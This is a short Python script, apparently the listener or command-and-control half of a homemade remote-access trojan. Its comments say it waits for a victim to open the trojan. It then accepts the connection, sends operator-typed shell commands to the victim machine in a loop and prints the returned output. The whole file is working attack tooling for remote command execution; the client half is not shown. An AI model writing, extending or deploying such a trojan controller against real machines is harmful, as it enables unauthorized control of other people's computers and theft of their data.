#listens for client to open trojan or run client.py program

import socket

HOST = '127.0.0.1' # '192.168.43.82'
PORT = 8081 # 2222
server = socket.socket()
server.bind((HOST, PORT))
print('[+] Server Started')
print('[+] Listening For Client Connection ...')

#awaiting client to connect
server.listen(1)

client, client_addr = server.accept()
print(f'[+] {client_addr} Client connected to the server')

#as long as client runs program continues to loop
while True:
    command = input('Enter Command : ')
    command = command.encode()

    #continues to send commands to client 
    client.send(command)
    print('[+] Command sent')

    #also recieves responses from clients command-line to be printed here as feedback
    output = client.recv(1024)
    output = output.decode()
    print(f"Output: {output}")